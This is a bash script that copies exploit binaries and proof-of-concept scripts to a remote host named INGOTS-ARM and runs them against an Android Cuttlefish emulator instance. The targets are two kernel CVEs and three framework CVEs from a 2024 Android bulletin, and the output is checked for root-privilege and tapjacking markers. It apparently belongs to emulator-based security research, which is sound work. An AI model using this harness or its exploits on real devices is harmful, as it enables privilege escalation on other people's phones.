#!/bin/bash
# Deploy and run exploits on Cuttlefish via INGOTS-ARM
#
# Kernel CVEs:
#   CVE-2024-36971: Remote ICMP Redirect → dst_negative_advice UAF (AF_PACKET on host)
#   CVE-2023-4622:  AF_UNIX gc race (PATCHED on instance 19 — will report blocked)
#
# Framework CVEs (ADB shell-based):
#   CVE-2024-34731: TranscodingResourcePolicy race condition
#   CVE-2023-20971: PermissionManagerService permission tree bypass
#   CVE-2024-34737: PiP aspect ratio flooding → tapjacking
#
# Usage:
#   ./deploy_and_test.sh --instance 19 --cve CVE-2024-36971
#   ./deploy_and_test.sh --instance 19 --cve framework   # run all framework PoCs
#   ./deploy_and_test.sh --instance 19 --cve all
#
# Prerequisites:
#   - SSH config has 'INGOTS-ARM' host defined
#   - Pre-compiled aarch64 binaries for kernel exploits
#   - Cuttlefish instance running
#   - For CVE-2024-36971: sudo on INGOTS-ARM (AF_PACKET raw sockets)

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REMOTE_HOST="${REMOTE_HOST:-INGOTS-ARM}"
INSTANCE="${INSTANCE:-19}"
CVE_TARGET="${CVE_TARGET:-all}"
REMOTE_DIR="/tmp/cve_exploits_2024_08"

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --instance) INSTANCE="$2"; shift 2 ;;
        --cve) CVE_TARGET="$2"; shift 2 ;;
        --host) REMOTE_HOST="$2"; shift 2 ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

ADB_PORT=$((6519 + INSTANCE))

echo "=== Android Bulletin 2024-08 Exploit Runner ==="
echo "[*] Remote: ${REMOTE_HOST}, Instance: ${INSTANCE}, ADB port: ${ADB_PORT}"
echo "[*] CVE target: ${CVE_TARGET}"
echo

# ── Step 1: Check local files ────────────────────────────────────────

check_binary() {
    local dir="$1"
    local binary="${SCRIPT_DIR}/${dir}/exploit_src/exploit"
    if [[ ! -f "${binary}" ]]; then
        echo "[-] Missing binary: ${binary}"
        echo "    Compile: cd ${SCRIPT_DIR}/${dir}/exploit_src && make"
        return 1
    fi
    echo "[+] Found: ${binary}"
}

echo "[*] Step 1: Checking local files..."
if [[ "${CVE_TARGET}" == "CVE-2024-36971" || "${CVE_TARGET}" == "all" || "${CVE_TARGET}" == "kernel" ]]; then
    check_binary "CVE-2024-36971_kernel_dst_uaf" || exit 1
fi
echo

# ── Step 2: Deploy to remote host ────────────────────────────────────

echo "[*] Step 2: Deploying to ${REMOTE_HOST}..."
ssh "${REMOTE_HOST}" "mkdir -p ${REMOTE_DIR}"

# Deploy kernel exploit files
for cve_dir in CVE-2024-36971_kernel_dst_uaf CVE-2023-4622_kernel_unix_socket; do
    src="${SCRIPT_DIR}/${cve_dir}"
    if [[ -d "${src}" ]]; then
        ssh "${REMOTE_HOST}" "mkdir -p ${REMOTE_DIR}/${cve_dir}/exploit_src"
        # Copy binary
        [[ -f "${src}/exploit_src/exploit" ]] && \
            scp -q "${src}/exploit_src/exploit" "${REMOTE_HOST}:${REMOTE_DIR}/${cve_dir}/exploit_src/"
        # Copy sources, headers, Makefile
        scp -q "${src}/exploit_src/"*.c "${src}/exploit_src/"*.h "${src}/exploit_src/Makefile" \
               "${REMOTE_HOST}:${REMOTE_DIR}/${cve_dir}/exploit_src/" 2>/dev/null || true
    fi
done

# Copy remote_trigger.py for CVE-2024-36971
[[ -f "${SCRIPT_DIR}/CVE-2024-36971_kernel_dst_uaf/remote_trigger.py" ]] && \
    scp -q "${SCRIPT_DIR}/CVE-2024-36971_kernel_dst_uaf/remote_trigger.py" \
           "${REMOTE_HOST}:${REMOTE_DIR}/CVE-2024-36971_kernel_dst_uaf/"

# Deploy framework PoC scripts
for cve_dir in \
    CVE-2024-34731_framework_transcoding_race \
    CVE-2023-20971_framework_permission_bypass \
    CVE-2024-34737_framework_pip_abuse; do
    src="${SCRIPT_DIR}/${cve_dir}"
    if [[ -d "${src}" ]]; then
        ssh "${REMOTE_HOST}" "mkdir -p ${REMOTE_DIR}/${cve_dir}"
        scp -q "${src}/poc.sh" "${REMOTE_HOST}:${REMOTE_DIR}/${cve_dir}/" 2>/dev/null || true
        [[ -f "${src}/exploit.sh" ]] && \
            scp -q "${src}/exploit.sh" "${REMOTE_HOST}:${REMOTE_DIR}/${cve_dir}/" 2>/dev/null || true
    fi
done

echo "[+] Files deployed"
echo

# ── Step 3: Run exploits ─────────────────────────────────────────────

run_kernel_36971() {
    echo "=============================================="
    echo "=== CVE-2024-36971: dst_entry UAF (ICMP Redirect) ==="
    echo "=============================================="
    ssh -t "${REMOTE_HOST}" "cd ${REMOTE_DIR}/CVE-2024-36971_kernel_dst_uaf && \
        sudo python3 remote_trigger.py --instance ${INSTANCE} --rounds 5"
    echo
}

run_kernel_4622() {
    echo "=============================================="
    echo "=== CVE-2023-4622: AF_UNIX gc race (PATCHED) ==="
    echo "=============================================="
    echo "[!] This CVE is PATCHED on instance ${INSTANCE} (5.10.107-maybe-dirty)"
    echo "[!] The spin_lock fix (commit 790c2f9d15b) closes the race window."
    echo "[!] Skipping — 80K+ attempts confirmed 0 corruptions."
    echo
}

run_framework() {
    local cve_dir="$1"
    local cve_id="$2"
    local script="$3"
    echo "=============================================="
    echo "=== ${cve_id} ==="
    echo "=============================================="
    ssh -t "${REMOTE_HOST}" "cd ${REMOTE_DIR}/${cve_dir} && bash ${script} ${ADB_PORT}"
    echo
}

case "${CVE_TARGET}" in
    CVE-2024-36971)
        run_kernel_36971
        ;;
    CVE-2023-4622)
        run_kernel_4622
        ;;
    CVE-2024-34731)
        run_framework "CVE-2024-34731_framework_transcoding_race" "CVE-2024-34731: Transcoding Race" "poc.sh"
        ;;
    CVE-2023-20971)
        run_framework "CVE-2023-20971_framework_permission_bypass" "CVE-2023-20971: Permission Bypass" "poc.sh"
        ;;
    CVE-2024-34737)
        run_framework "CVE-2024-34737_framework_pip_abuse" "CVE-2024-34737: PiP Flooding" "poc.sh"
        ;;
    framework)
        echo "[*] Step 3: Running all framework exploit PoCs..."
        echo
        run_framework "CVE-2024-34731_framework_transcoding_race" "CVE-2024-34731: Transcoding Race" "poc.sh"
        run_framework "CVE-2023-20971_framework_permission_bypass" "CVE-2023-20971: Permission Bypass" "poc.sh"
        run_framework "CVE-2024-34737_framework_pip_abuse" "CVE-2024-34737: PiP Flooding" "poc.sh"
        ;;
    kernel)
        echo "[*] Step 3: Running kernel exploits..."
        echo
        run_kernel_36971
        run_kernel_4622
        ;;
    all)
        echo "[*] Step 3: Running all exploits..."
        echo
        # Kernel
        run_kernel_36971
        run_kernel_4622
        # Framework
        run_framework "CVE-2024-34731_framework_transcoding_race" "CVE-2024-34731: Transcoding Race" "poc.sh"
        run_framework "CVE-2023-20971_framework_permission_bypass" "CVE-2023-20971: Permission Bypass" "poc.sh"
        run_framework "CVE-2024-34737_framework_pip_abuse" "CVE-2024-34737: PiP Flooding" "poc.sh"
        ;;
    *)
        echo "[-] Unknown CVE: ${CVE_TARGET}"
        echo "    Supported: CVE-2024-36971, CVE-2023-4622, CVE-2024-34731,"
        echo "               CVE-2023-20971, CVE-2024-34737, framework, kernel, all"
        exit 1
        ;;
esac

echo "=== Deployment and testing complete ==="
echo "[*] Check output for:"
echo "    - Kernel: SYZPLOIT_UID_AFTER=0 / PRIVESC_DONE"
echo "    - Framework: crash/tombstone indicators, permission state changes, PiP stuck state"
